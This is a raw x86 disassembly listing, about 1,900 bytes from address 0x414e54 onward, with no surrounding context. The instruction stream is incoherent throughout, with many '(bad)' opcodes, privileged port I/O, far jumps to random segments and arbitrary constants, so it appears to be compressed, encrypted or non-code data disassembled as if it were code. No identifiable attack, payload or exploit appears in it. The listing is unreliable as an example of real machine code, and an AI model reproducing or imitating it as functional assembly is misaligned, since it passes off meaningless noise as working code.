  414e54:	hlt    
  414e55:	or     BYTE PTR [ebx],bl
  414e57:	or     BYTE PTR [edi+esi*2-0x3d],cl
  414e5b:	mov    dl,0x1b
  414e5d:	cld    
  414e5e:	jo     0x414ed7
  414e60:	(bad)  
  414e61:	sbb    dh,BYTE PTR [edi+0x1db99f39]
  414e67:	xchg   ebx,eax
  414e68:	mov    ds:0xcc52d4f9,eax
  414e6d:	outs   dx,DWORD PTR ds:[esi]
  414e6e:	aaa    
  414e6f:	mov    BYTE PTR [edi+0x7f223289],cl
  414e75:	ins    DWORD PTR es:[edi],dx
  414e76:	xchg   DWORD PTR [ebp+0x4d],ecx
  414e79:	out    dx,eax
  414e7a:	and    DWORD PTR [ebx],ebp
  414e7c:	pop    ebp
  414e7d:	add    al,0xde
  414e7f:	mov    eax,0xbfcac48d
  414e84:	xchg   ebx,eax
  414e85:	push   cs
  414e86:	lds    edx,FWORD PTR [esi-0xaa10d9]
  414e8c:	push   ebp
  414e8d:	cs mov ebx,0x3c02c12e
  414e93:	mov    ebp,0xeef487ec
  414e98:	pop    ebx
  414e99:	(bad)  
  414e9a:	test   eax,0x8c745a4
  414e9f:	ss test eax,0x24729851
  414ea5:	jne    0x414ef3
  414ea7:	addr16 push ecx
  414ea9:	out    0xd0,al
  414eab:	sbb    eax,0x15ccf85d
  414eb0:	adc    cl,ah
  414eb2:	sub    DWORD PTR [edx+ebp*4-0xe791cb9],edi
  414eb9:	jo     0x414e3c
  414ebb:	outs   dx,DWORD PTR ds:[esi]
  414ebc:	dec    ecx
  414ebd:	push   ss
  414ebe:	fidiv  WORD PTR [edx-0x60]
  414ec1:	inc    edx
  414ec2:	xchg   edx,eax
  414ec3:	mov    al,0x8
  414ec5:	mul    DWORD PTR [eax-0x769f6ef2]
  414ecb:	cld    
  414ecc:	shr    DWORD PTR [edx-0x61],1
  414ecf:	dec    ebp
  414ed0:	jle    0x414ea5
  414ed2:	test   al,0xf8
  414ed4:	or     BYTE PTR [eax],ah
  414ed6:	dec    ebx
  414ed7:	jp     0x414f33
  414ed9:	shl    DWORD PTR [ecx-0x340bd31e],0x3f
  414ee0:	sar    DWORD PTR [ecx+0x83a817d],1
  414ee6:	inc    edi
  414ee7:	fwait
  414ee8:	and    bl,BYTE PTR [ecx]
  414eea:	xor    ebp,DWORD PTR [eax*4-0x2d572cd3]
  414ef1:	mov    BYTE PTR [ebx+ebx*4+0x634a52eb],0x23
  414ef9:	xchg   ecx,eax
  414efa:	sub    ah,BYTE PTR [edx+0x2658d89]
  414f00:	inc    ebx
  414f01:	cmp    esi,ebp
  414f03:	add    cl,bl
  414f05:	jo     0x414f82
  414f07:	push   0x6c39d3fe
  414f0c:	aad    0x47
  414f0e:	xor    DWORD PTR [edx],edx
  414f10:	daa    
  414f11:	out    dx,eax
  414f12:	inc    ebx
  414f13:	inc    edx
  414f14:	cmp    BYTE PTR [ebp+edx*4-0x9],bh
  414f18:	sbb    eax,0xb3ba8f26
  414f1d:	push   ecx
  414f1e:	mov    DWORD PTR [edx],esp
  414f20:	repz xchg ebp,eax
  414f22:	push   eax
  414f23:	xchg   ebx,eax
  414f24:	dec    ebp
  414f25:	jp     0x414f9a
  414f27:	inc    ecx
  414f28:	cmp    edx,DWORD PTR [eax]
  414f2a:	pop    esp
  414f2b:	dec    ecx
  414f2c:	sar    BYTE PTR [ebp-0x14],0x80
  414f30:	adc    eax,0x2f98d88
  414f35:	sbb    ch,BYTE PTR ds:0x9017b0db
  414f3b:	adc    edx,DWORD PTR [ecx]
  414f3d:	mov    eax,0x1d69cf1d
  414f42:	pop    ds
  414f43:	jnp    0x414efe
  414f45:	gs inc ecx
  414f47:	xchg   BYTE PTR [ebp-0x71fb79d5],ah
  414f4d:	xchg   esi,eax
  414f4e:	jmp    0x414faf
  414f50:	ja     0x414f48
  414f52:	pop    es
  414f53:	push   esp
  414f54:	sub    BYTE PTR [esp+edi*4+0x5ac67545],al
  414f5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f5c:	mov    al,0xa0
  414f5e:	or     bl,BYTE PTR [esi-0x70]
  414f61:	sub    esi,DWORD PTR [edx+0x65a0e7d]
  414f67:	cdq    
  414f68:	xchg   edi,eax
  414f69:	mov    BYTE PTR ds:0x7e5390b6,0xfb
  414f70:	call   0xf076ec16
  414f75:	fsub   DWORD PTR [eax]
  414f77:	xchg   esi,eax
  414f78:	mov    esp,0x3b67aa58
  414f7d:	cmp    DWORD PTR [ebx+0x6bf50f4],ecx
  414f83:	sahf   
  414f84:	and    eax,0xc09c7ca9
  414f89:	pop    ds
  414f8a:	nop
  414f8b:	add    DWORD PTR [ebx+ebx*8+0xc],esp
  414f8f:	jne    0x414f13
  414f91:	fs dec edx
  414f93:	stc    
  414f94:	shl    cl,1
  414f96:	push   bp
  414f98:	ret    
  414f99:	enter  0xbf9,0xed
  414f9d:	cwde   
  414f9e:	push   ecx
  414f9f:	sbb    edx,esi
  414fa1:	dec    esp
  414fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fa3:	xor    BYTE PTR ds:0xd15c7cb2,dl
  414fa9:	sbb    al,0xbc
  414fab:	jo     0x414fd1
  414fad:	jmp    0x4a9e:0x56242a1
  414fb4:	inc    ebp
  414fb5:	xor    al,0xe9
  414fb7:	out    dx,eax
  414fb8:	mov    bl,0x30
  414fba:	pop    ss
  414fbb:	pop    ebp
  414fbc:	out    0x40,al
  414fbe:	enter  0x26f5,0xd5
  414fc2:	push   eax
  414fc3:	mov    dl,BYTE PTR [esi]
  414fc5:	(bad)  
  414fc6:	pop    edx
  414fc7:	ret    
  414fc8:	pop    ebx
  414fc9:	sbb    BYTE PTR [esi],al
  414fcb:	inc    esi
  414fcc:	pop    ebx
  414fcd:	or     DWORD PTR [ebx],edx
  414fcf:	and    eax,0x41fc9cc4
  414fd4:	push   ds
  414fd5:	xchg   ecx,eax
  414fd6:	pop    DWORD PTR [edx+ebx*8]
  414fd9:	inc    BYTE PTR [ebx-0x7b]
  414fdc:	cmc    
  414fdd:	cmc    
  414fde:	or     bl,ah
  414fe0:	sbb    DWORD PTR [edi-0x6bbec575],0x746fa36a
  414fea:	outs   dx,DWORD PTR ds:[esi]
  414feb:	mov    esi,0x46d3ed5c
  414ff0:	icebp  
  414ff1:	scas   eax,DWORD PTR es:[edi]
  414ff2:	test   ebp,eax
  414ff4:	adc    al,0x5a
  414ff6:	(bad)  
  414ff7:	fstp   TBYTE PTR [ebx-0x15]
  414ffa:	outs   dx,DWORD PTR ds:[esi]
  414ffb:	dec    edx
  414ffc:	ins    DWORD PTR es:[edi],dx
  414ffd:	and    BYTE PTR [edi],al
  414fff:	mov    ch,0x9
  415001:	mov    al,ds:0xf35a9beb
  415006:	xor    al,0xc9
  415008:	cmp    BYTE PTR [edi+0x64a39a28],ch
  41500e:	pusha  
  41500f:	jb     0x415057
  415011:	int    0xa
  415013:	clc    
  415014:	add    esp,DWORD PTR [ebx-0x7ba1c0bc]
  41501a:	adc    BYTE PTR [edx-0x5d582e5a],0xd8
  415021:	mov    edx,0x6c014549
  415026:	clc    
  415027:	jmp    0x7a7f:0x1c6aa37c
  41502e:	dec    ecx
  41502f:	pop    DWORD PTR [esi]
  415031:	push   es
  415032:	inc    esp
  415033:	or     DWORD PTR [ecx],ebx
  415035:	sub    eax,0xa98a5deb
  41503a:	jae    0x41508c
  41503c:	stc    
  41503d:	and    dl,bl
  41503f:	or     bh,BYTE PTR ds:0xa3a2aab3
  415045:	adc    edi,ebp
  415047:	push   esi
  415048:	repz and ch,BYTE PTR [ecx+ebp*4+0x4c]
  41504d:	and    dl,cl
  41504f:	jl     0x415050
  415051:	inc    ebx
  415052:	ret    
  415053:	adc    dl,BYTE PTR [ecx+0x236063ff]
  415059:	or     DWORD PTR [ebx-0x804f66],ebx
  41505f:	mov    ebp,0xafa81793
  415064:	sub    ch,ah
  415066:	scas   eax,DWORD PTR es:[edi]
  415067:	shl    DWORD PTR [edx-0x45fae565],cl
  41506d:	mov    edx,0x6f4bd0f2
  415072:	inc    ecx
  415073:	and    esp,ebp
  415075:	fnstsw WORD PTR [ebp-0x61]
  415078:	(bad)  
  415079:	in     eax,dx
  41507a:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41507c:	jmp    0x163c4231
  415081:	cmp    DWORD PTR [ebp+0x32],ecx
  415084:	popa   
  415085:	jnp    0x415047
  415087:	and    eax,DWORD PTR [esi+0x33]
  41508a:	adc    DWORD PTR [edx-0x45],esp
  41508d:	jnp    0x415059
  41508f:	stc    
  415090:	stos   BYTE PTR es:[edi],al
  415091:	test   BYTE PTR [eax],ah
  415093:	add    BYTE PTR fs:[edx-0x1a8af653],cl
  41509a:	xor    bh,dl
  41509c:	in     al,0xd2
  41509e:	sub    eax,0xe34d8af4
  4150a3:	es ja  0x4150af
  4150a6:	jle    0x415053
  4150a8:	sti    
  4150a9:	and    ebx,ebx
  4150ab:	out    0xca,al
  4150ad:	push   esi
  4150ae:	xor    edx,DWORD PTR [ecx+0x39f299e8]
  4150b4:	add    al,0xd
  4150b6:	dec    edx
  4150b7:	jge    0x415080
  4150b9:	out    dx,al
  4150ba:	jmp    0x4150c8
  4150bc:	std    
  4150bd:	cld    
  4150be:	sub    ah,BYTE PTR [ebx+0x383f49ba]
  4150c4:	mov    esp,0xaa70a7e8
  4150c9:	push   esp
  4150ca:	xor    ebx,edx
  4150cc:	inc    ebp
  4150cd:	pop    ebp
  4150ce:	(bad)  
  4150cf:	fistp  WORD PTR [ecx]
  4150d1:	inc    ebp
  4150d2:	xor    edi,DWORD PTR [ecx+edi*4-0x5a]
  4150d6:	or     eax,0x46295ba
  4150db:	xor    al,0xcc
  4150dd:	dec    ebx
  4150de:	dec    ecx
  4150df:	or     eax,ecx
  4150e1:	call   0xcd3:0x4b2817ba
  4150e8:	ss pop esi
  4150ea:	sub    DWORD PTR [edx-0x35],esp
  4150ed:	in     eax,dx
  4150ee:	clc    
  4150ef:	pop    ss
  4150f0:	cwde   
  4150f1:	jo     0x4150fe
  4150f3:	push   esi
  4150f4:	aad    0x16
  4150f6:	mov    DWORD PTR [ebp-0x208bd63d],edi
  4150fc:	lahf   
  4150fd:	dec    ebx
  4150fe:	loopne 0x4150d7
  415100:	int    0x8
  415102:	std    
  415103:	jae    0x415130
  415105:	ds cwde 
  415107:	jns    0x4150cc
  415109:	fiadd  DWORD PTR [esi-0x6e11f853]
  41510f:	fcmovu st,st(2)
  415111:	mov    edi,0xcb4bdd34
  415116:	int3   
  415117:	mov    edi,0x46b40594
  41511c:	lea    eax,[edx+edi*4]
  41511f:	xchg   edx,eax
  415120:	pop    es
  415121:	shl    DWORD PTR [ebp-0x7fc56b04],0x50
  415128:	dec    edi
  415129:	loope  0x415188
  41512b:	fldpi  
  41512d:	mov    bl,0x6c
  41512f:	sub    DWORD PTR [edx],ebx
  415131:	(bad)
  415134:	adc    DWORD PTR [ebx+ebp*4-0x64de7e83],0x685313df
  41513f:	ror    DWORD PTR [edx-0x1e105],1
  415145:	ror    esp,1
  415147:	sub    ecx,ebx
  415149:	and    ecx,DWORD PTR [ebx]
  41514b:	xor    bh,BYTE PTR [eax-0x51]
  41514e:	ret    0xb139
  415151:	loop   0x4151a1
  415153:	inc    edx
  415154:	(bad)  
  415155:	ds dec esp
  415157:	cld    
  415158:	push   es
  415159:	mov    al,fs:0xec67754c
  41515f:	dec    eax
  415160:	fdiv   QWORD PTR [eax-0x14033801]
  415166:	into   
  415167:	sbb    al,0x91
  415169:	dec    edx
  41516a:	sub    eax,0xf75c3945
  41516f:	add    BYTE PTR [ebp+edi*1+0x70],al
  415173:	adc    ch,BYTE PTR [ecx+0x65]
  415176:	jbe    0x4151b0
  415178:	dec    edi
  415179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41517a:	lods   eax,DWORD PTR ds:[esi]
  41517b:	cs sbb edx,eax
  41517e:	add    BYTE PTR [esi-0x22],bl
  415181:	adc    eax,0x4196bf4c
  415186:	fld    DWORD PTR [edx-0x4b]
  415189:	push   ecx
  41518a:	jmp    0xc80b:0x9eede936
  415191:	mov    esi,0xc1befd6a
  415196:	mov    al,0xe3
  415198:	sahf   
  415199:	add    al,0x68
  41519b:	data16 outs dx,BYTE PTR ds:[esi]
  41519d:	rcr    ch,0xc5
  4151a0:	or     cl,0xea
  4151a3:	jg     0x415206
  4151a5:	ret    
  4151a6:	pop    ebx
  4151a7:	add    eax,0xe776754a
  4151ac:	mov    WORD PTR [ecx+0x66],?
  4151af:	scas   eax,DWORD PTR es:[edi]
  4151b0:	dec    esp
  4151b1:	fisub  DWORD PTR fs:0x8e1737da
  4151b8:	mov    bh,BYTE PTR [edx+0xb11e524]
  4151be:	add    dh,BYTE PTR [ebx+edx*8-0x67]
  4151c2:	inc    ecx
  4151c3:	mov    eax,0x754579fb
  4151c8:	mov    ecx,ebx
  4151ca:	int    0xd7
  4151cc:	dec    ebx
  4151cd:	dec    ecx
  4151ce:	push   ss
  4151cf:	(bad)  
  4151d0:	daa    
  4151d1:	adc    DWORD PTR [esi+0x4fe33bad],edi
  4151d7:	jmp    0x7840:0x96608e90
  4151de:	or     eax,0xf35182c0
  4151e3:	push   ebp
  4151e4:	popa   
  4151e5:	dec    edi
  4151e6:	xlat   BYTE PTR ds:[ebx]
  4151e7:	jae    0x415236
  4151e9:	and    al,0x31
  4151eb:	ss push edi
  4151ed:	mov    ecx,0xd1dde57b
  4151f2:	call   0x82b53f
  4151f7:	addr16 call 0xbe1a:0x7323326a
  4151ff:	inc    esi
  415200:	xor    eax,0x33134149
  415205:	jb     0x41520e
  415207:	pop    esp
  415208:	xchg   esi,eax
  415209:	mov    al,0xf4
  41520b:	addr16 out dx,al
  41520d:	imul   eax,DWORD PTR [edi+0x636d814e],0x1c
  415214:	or     al,0xa3
  415216:	or     ebx,DWORD PTR [edi]
  415218:	xchg   edi,eax
  415219:	mov    ecx,0x6c66d343
  41521e:	outs   dx,BYTE PTR ds:[esi]
  41521f:	inc    ecx
  415220:	cmp    BYTE PTR [esi-0x25f0eec0],bl
  415226:	xchg   esp,eax
  415227:	push   0xffffffda
  415229:	jns    0x41523d
  41522b:	mov    eax,0xf1cb9c64
  415230:	adc    dl,BYTE PTR [edi+ebp*1+0x222ca36f]
  415237:	std    
  415238:	stos   BYTE PTR es:[edi],al
  415239:	ss jcxz 0x415216
  41523d:	cld    
  41523e:	push   ds
  41523f:	js     0x415282
  415241:	inc    edx
  415242:	sbb    eax,0x1751114b
  415247:	push   ebx
  415248:	out    dx,al
  415249:	dec    ecx
  41524a:	int    0x5f
  41524c:	lock sbb eax,DWORD PTR [ebx+0x10]
  415250:	bnd jnp 0x415277
  415253:	stos   BYTE PTR es:[edi],al
  415254:	aam    0xa0
  415256:	test   DWORD PTR [ebp+0x77],esi
  415259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41525a:	cmp    eax,0x446e3838
  41525f:	cmc    
  415260:	cld    
  415261:	mov    bh,al
  415263:	cmp    BYTE PTR [esp+ecx*1],al
  415266:	add    DWORD PTR ds:0xe851f829,0x9b7999c7
  415270:	mov    es,edi
  415272:	jmp    0x5aaa8be
  415277:	pop    esi
  415278:	and    al,0xb8
  41527a:	xchg   DWORD PTR [ebx+0x7b0795e6],ebp
  415280:	iret   
  415281:	or     eax,DWORD PTR [ebx+0x3f5a88dc]
  415287:	push   ebp
  415288:	fdiv   DWORD PTR [ecx+0x7a5b36a3]
  41528e:	sbb    edi,DWORD PTR [ebx]
  415290:	jmp    0x415226
  415292:	lods   eax,DWORD PTR ds:[esi]
  415293:	ss into 
  415295:	imul   ecx,DWORD PTR [edx],0xffffff8c
  415298:	iret   
  415299:	jecxz  0x4152af
  41529b:	jb     0x415275
  41529d:	ins    DWORD PTR es:[edi],dx
  41529e:	cmp    esp,0x66
  4152a1:	call   0xfd5e3516
  4152a6:	arpl   WORD PTR [ecx],si
  4152a8:	add    edx,DWORD PTR [edx+edi*8-0x58]
  4152ac:	jl     0x41529e
  4152ae:	out    0x5c,al
  4152b0:	and    eax,0x2a
  4152b3:	mov    esp,0x9181d829
  4152b8:	call   0xe2bb170a
  4152bd:	mov    BYTE PTR ds:0xc9e13ca6,ch
  4152c3:	mov    eax,ds:0x519fb169
  4152c8:	popa   
  4152c9:	cdq    
  4152ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152cb:	cmp    esi,DWORD PTR [esi-0x38]
  4152ce:	push   esp
  4152cf:	sub    al,0xc0
  4152d1:	xlat   BYTE PTR ds:[ebx]
  4152d2:	(bad)  
  4152d3:	test   eax,0x7d3e4f5a
  4152d8:	call   0x197de840
  4152dd:	and    eax,0x3825c5a
  4152e2:	fimul  WORD PTR [esi+0x5304af69]
  4152e8:	add    eax,0x2e4b0c61
  4152ed:	pop    esp
  4152ee:	sbb    DWORD PTR fs:[edi],edi
  4152f1:	jb     0x41530f
  4152f3:	add    DWORD PTR [edi],esi
  4152f5:	in     al,0x19
  4152f7:	(bad)  
  4152f8:	adc    eax,0x1af88281
  4152fd:	neg    ebx
  4152ff:	rcl    BYTE PTR [ecx+0x490d99cf],1
  415305:	mov    eax,DWORD PTR [ebp+edi*4-0x3]
  415309:	(bad)  
  41530b:	mov    bl,0x70
  41530d:	pop    edx
  41530e:	mov    WORD PTR [ebp-0x78],cs
  415311:	inc    ecx
  415312:	inc    edx
  415313:	bound  edx,QWORD PTR [ebx+0x4]
  415316:	mov    cl,0x21
  415318:	xor    al,0xcc
  41531a:	(bad)  
  41531b:	in     eax,dx
  41531c:	ja     0x4152a3
  41531e:	and    dl,BYTE PTR [ebp+0x743021f4]
  415324:	mov    ch,0x78
  415326:	fstp   st(0)
  415328:	add    DWORD PTR [edx],eax
  41532a:	ins    BYTE PTR es:[edi],dx
  41532b:	outs   dx,BYTE PTR ds:[esi]
  41532c:	sbb    edx,DWORD PTR ds:0xb3a7f24e
  415332:	pop    ecx
  415333:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415334:	add    BYTE PTR [edx+0x2b],al
  415337:	adc    edx,edi
  415339:	sahf   
  41533a:	jmp    0xc692:0xb0b43874
  415341:	add    BYTE PTR [ebp+0x60],al
  415344:	and    eax,0xd905657e
  415349:	inc    esp
  41534a:	adc    eax,0xa154313e
  41534f:	ret    0xfc6
  415352:	mov    ecx,0x65d4e50
  415357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415358:	clc    
  415359:	and    eax,0x56cfb172
  41535e:	(bad)  
  41535f:	icebp  
  415360:	dec    esi
  415361:	dec    edi
  415362:	fisttp DWORD PTR [eax+0x469c675b]
  415368:	xchg   esi,eax
  415369:	xchg   esp,eax
  41536a:	repnz push ecx
  41536c:	mov    ds:0x76c0a9a4,al
  415371:	arpl   WORD PTR [ecx],sp
  415373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415374:	inc    esp
  415375:	dec    ebp
  415376:	inc    esp
  415377:	mov    ah,0xf0
  415379:	stc    
  41537a:	jecxz  0x415324
  41537c:	xor    DWORD PTR [ecx],ebx
  41537e:	lods   al,BYTE PTR ds:[esi]
  41537f:	idiv   BYTE PTR [ebp-0x55]
  415382:	push   esi
  415383:	pop    ds
  415384:	idiv   DWORD PTR [edx-0x2fe85c4]
  41538a:	xchg   edx,eax
  41538b:	mov    esp,0x35d8d648
  415390:	sti    
  415391:	adc    eax,DWORD PTR [edi-0x22]
  415394:	add    al,0xd9
  415396:	imul   edx,DWORD PTR [ecx],0xffffffc4
  415399:	loopne 0x4153b6
  41539b:	fdivr  QWORD PTR [ebx+0x2d28e527]
  4153a1:	pushf  
  4153a2:	adc    DWORD PTR [eax-0x49aa6c66],0xa385d414
  4153ac:	xchg   ebx,eax
  4153ad:	int    0x77
  4153af:	jns    0x415383
  4153b1:	dec    esp
  4153b2:	div    BYTE PTR [edi+edi*4-0x49bc6adc]
  4153b9:	mov    ds:0x763baf5d,al
  4153be:	loop   0x415346
  4153c0:	sbb    cl,ah
  4153c2:	pop    edx
  4153c3:	jbe    0x415420
  4153c5:	mov    ebp,0x171ca0a2
  4153ca:	sub    eax,0x4c00633d
  4153cf:	push   esp
  4153d0:	sub    DWORD PTR [edx+eax*4+0x7],ecx
  4153d4:	inc    esi
  4153d5:	bound  edi,QWORD PTR [eax-0x4fff437f]
  4153db:	in     al,dx
  4153dc:	pop    ds
  4153dd:	lds    ebx,FWORD PTR [eax]
  4153df:	sti    
  4153e0:	enter  0x99f2,0x18
  4153e4:	ins    DWORD PTR es:[edi],dx
  4153e5:	clc    
  4153e6:	jno    0x415443
  4153e8:	loopne 0x4153a6
  4153ea:	push   ebx
  4153eb:	sbb    eax,0x49a87dd0
  4153f0:	push   edx
  4153f1:	cmc    
  4153f2:	jle    0x4153cc
  4153f4:	adc    al,0xd9
  4153f6:	xor    al,0x59
  4153f8:	ins    BYTE PTR es:[edi],dx
  4153f9:	or     BYTE PTR [eax],dh
  4153fb:	mov    eax,DWORD PTR [eax+0x638f3b36]
  415401:	lahf   
  415402:	ins    DWORD PTR es:[edi],dx
  415403:	sub    al,0x8f
  415405:	inc    eax
  415406:	dec    edi
  415407:	push   edi
  415408:	cmp    BYTE PTR [ebp+0x1bc6f275],dh
  41540e:	rol    ah,cl
  415410:	add    ebx,DWORD PTR [edi+0x6ceab94b]
  415416:	icebp  
  415417:	aam    0xd3
  415419:	ins    BYTE PTR es:[edi],dx
  41541a:	(bad)  
  41541b:	leave  
  41541c:	lods   eax,DWORD PTR ds:[esi]
  41541d:	iret   
  41541e:	pop    edx
  41541f:	in     al,dx
  415420:	inc    edi
  415421:	arpl   bx,ax
  415423:	(bad)  
  415424:	popf   
  415425:	mov    WORD PTR [ecx+edx*4-0x7f],es
  415429:	call   0xad4754a0
  41542e:	fnstsw WORD PTR [ecx]
  415430:	jge    0x4153fc
  415432:	jg     0x415444
  415434:	or     eax,0xb6c9417b
  415439:	xor    al,0x16
  41543b:	cwde   
  41543c:	mov    al,ds:0xe73225c3
  415441:	push   ecx
  415442:	std    
  415443:	arpl   sp,di
  415445:	pop    ss
  415446:	add    DWORD PTR [eax],esi
  415448:	push   0x1cf999fd
  41544d:	fstp   TBYTE PTR [edx+0x7dd73157]
  415453:	std    
  415454:	xchg   esi,eax
  415455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415456:	xor    al,al
  415458:	ret    0x300e
  41545b:	adc    DWORD PTR [eax+ebp*1+0x51],esp
  41545f:	and    ah,BYTE PTR [edx]
  415461:	loop   0x415460
  415463:	fidivr WORD PTR [edi-0x25]
  415466:	pop    ds
  415467:	cmp    BYTE PTR [eax+0x4fea74e5],0x63
  41546e:	jo     0x415469
  415470:	xchg   ecx,eax
  415471:	cs pop ds
  415473:	in     eax,0x7e
  415475:	aam    0x5d
  415477:	cmp    eax,0xaf2a61f
  41547c:	imul   edi,DWORD PTR [edi+0x1e],0xffffffd9
  415480:	jge    0x415444
  415482:	mov    al,0xa2
  415484:	mov    ch,0xc2
  415486:	enter  0xe766,0xba
  41548a:	mov    eax,ds:0x1e3375c6
  41548f:	mov    ebp,0x1a245603
  415494:	sub    dl,BYTE PTR [eax+0x675b6ea7]
  41549a:	xor    al,0x70
  41549c:	sub    DWORD PTR [eax],0xffffffb6
  41549f:	jmp    0x9d3c:0xa89b24fa
  4154a6:	popa   
  4154a7:	mov    ds:0x6c28325c,al
  4154ac:	sbb    eax,0x3732111a
  4154b1:	mov    WORD PTR [eax],es
  4154b3:	dec    esp
  4154b4:	jge    0x415522
  4154b6:	mov    cl,0x60
  4154b8:	es mov esp,0xf67b8e13
  4154be:	pop    eax
  4154bf:	sub    cl,BYTE PTR [bx+si+0x55]
  4154c3:	loopne 0x41553b
  4154c5:	add    eax,0x974b8bd4
  4154ca:	loopne 0x41553d
  4154cc:	pop    edi
  4154cd:	sbb    al,0x4
  4154cf:	cli    
  4154d0:	mov    edi,0xf51353a5
  4154d5:	jmp    0x41553d
  4154d7:	inc    esp
  4154d8:	mov    edi,0xd34055af
  4154dd:	int3   
  4154de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154df:	out    0x28,al
  4154e1:	adc    BYTE PTR [edx+eax*8-0x1e],bh
  4154e5:	arpl   WORD PTR [esi+ecx*8-0x24eae207],bp
  4154ec:	int3   
  4154ed:	cmp    ch,BYTE PTR [ecx+0x2e]
  4154f0:	in     eax,dx
  4154f1:	xor    BYTE PTR [ebx+0x60],0xd9
  4154f5:	jmp    0x4154a5
  4154f7:	loop   0x4154bb
  4154f9:	sbb    esi,eax
  4154fb:	les    edx,FWORD PTR [ebx+eiz*4-0x70482e64]
  415502:	addr16 sub al,0x74
  415505:	(bad)  
  415506:	lods   eax,DWORD PTR ds:[esi]
  415507:	es jmp 0x8302:0xd4a19268
  41550f:	xor    al,0x1
  415511:	dec    edi
  415512:	dec    ecx
  415513:	dec    edi
  415514:	scas   al,BYTE PTR es:[edi]
  415515:	cmc    
  415516:	out    0x75,al
  415518:	lahf   
  415519:	jl     0x415503
  41551b:	hlt    
  41551c:	ds cld 
  41551e:	or     BYTE PTR [edi-0x7e],al
  415521:	push   cs
  415522:	mov    al,ds:0xc6a4f6a2
  415527:	shl    DWORD PTR [edx-0xd],cl
  41552a:	rcr    bh,0xb
  41552d:	sbb    al,0x93
  41552f:	icebp  
  415530:	jmp    0x4154ef
  415532:	jno    0x4154bc
  415534:	pop    ds
  415535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415536:	addr16 jle 0x41550d
  415539:	sbb    ecx,edi
  41553b:	xchg   esp,eax
  41553c:	pushf  
  41553d:	jmp    0xd707:0xe44c6f2
  415544:	inc    edi
  415545:	push   ecx
  415546:	bound  edi,QWORD PTR [ebp+0x5df082cb]
  41554c:	int3   
  41554d:	loope  0x41554b
  41554f:	leave  
  415550:	push   ebp
  415551:	inc    eax
  415552:	mov    BYTE PTR [ecx-0x28],0x30
  415556:	xchg   ecx,eax
  415557:	cld    
  415558:	pop    ebx
  415559:	repz push ebp
  41555b:	ja     0x4155c8
  41555d:	mov    WORD PTR [eax],cs
  41555f:	push   ds
  415560:	adc    eax,0x7d52661b
  415565:	ror    BYTE PTR [eax],0xbe
  415568:	jb     0x4155b7
  41556a:	push   ds
  41556b:	jb     0x415588
  41556d:	(bad)  
  41556f:	xlat   BYTE PTR ds:[ebx]
  415570:	lds    ecx,FWORD PTR [ecx]
  415572:	jecxz  0x41554c
  415574:	add    eax,0xe3d074
  415579:	outs   dx,DWORD PTR ds:[esi]
  41557a:	nop
  41557b:	in     al,0x91
  41557d:	and    DWORD PTR [eax-0x7],edx
  415580:	pushf  
  415581:	pop    ds
  415582:	or     DWORD PTR [esi],0x7ef6aea
  415588:	ja     0x415512
  41558a:	cmc    
  41558b:	inc    ebx
  41558c:	xor    eax,0xbbd6392b
  415591:	mov    esp,0x4430f3bd
  415596:	push   ecx
  415597:	int3   
  415598:	ret    0xc30a
  41559b:	cmp    bh,bl
  41559d:	mov    esi,0x9af16624
  4155a2:	lea    ecx,ds:0x7d2b46a7
  4155a8:	mov    WORD PTR [eax],?
  4155aa:	cs mov ebx,0x7a8ca0d7
  4155b0:	daa    
  4155b1:	xlat   BYTE PTR ds:[ebx]
  4155b2:	aaa    
  4155b3:	mov    al,ds:0x6914d81e
  4155b8:	xor    al,0xf4
  4155ba:	jne    0x415613
  4155bc:	in     al,dx
  4155bd:	xchg   ecx,eax
  4155be:	enter  0x78f8,0x63
  4155c2:	popf   
  4155c3:	(bad)  
  4155c4:	dec    esp
  4155c5:	or     al,0xa0
  4155c7:	dec    ebp
  4155c8:	mov    DWORD PTR [ecx],esi
  4155ca:	sbb    eax,0x2aacb7ca
  4155cf:	outs   dx,BYTE PTR ds:[esi]
  4155d0:	popa   
  4155d1:	cwde   
  4155d2:	mov    bl,0xa0
  4155d4:	mul    DWORD PTR [ebp+0x2f]
  4155d7:	jno    0x415612
  4155d9:	sbb    DWORD PTR [eax-0x653a5fbb],edx
  4155df:	xor    bh,ch
  4155e1:	std    
  4155e2:	pop    edx
  4155e3:	dec    eax
  4155e4:	mov    ds:0x6a30f103,eax
  4155e9:	or     BYTE PTR [ebp-0x5e146255],bh
  4155ef:	std    
  4155f0:	scas   eax,DWORD PTR es:[edi]
  4155f1:	test   BYTE PTR [edi],al
  4155f3:	ins    DWORD PTR es:[edi],dx
  4155f4:	jle    0x4155d9
  4155f6:	neg    ebx
  4155f8:	dec    esp
  4155f9:	call   0x10633de6
  4155fe:	sahf   
  4155ff:	out    0x70,eax
  415601:	lock pop ss
  415603:	fstp   DWORD PTR [edi-0x73cbe42e]
  415609:	jp     0x415651
  41560b:	fisttp DWORD PTR [edi-0xe791696]
  415611:	inc    edi
  415612:	nop
  415613:	inc    ecx
  415614:	xchg   BYTE PTR [ecx+esi*2],ah
  415617:	loope  0x4155ba
  415619:	test   eax,0x2612de7
  41561e:	push   ecx
  41561f:	xchg   DWORD PTR [edx],edx
  415621:	mov    edi,DWORD PTR [esp+ebx*2-0x70]
  415625:	inc    ebp
  415626:	inc    eax
  415627:	inc    edx
  415628:	jbe    0x415646
  41562a:	ret    0x5ef
  41562d:	not    BYTE PTR [ebp-0x5e]
  415630:	(bad)  
  415631:	cli    
  415632:	adc    ch,cl
  415634:	shr    DWORD PTR [eax-0x19],0x13
  415638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415639:	mov    dh,0x1
  41563b:	push   0x2d7dc97d
  415640:	(bad)  
  415641:	pop    edi
  415642:	jp     0x415617
  415644:	fldcw  WORD PTR [edi+0x23921055]
  41564a:	adc    DWORD PTR ds:[ebx],0xffffffdc
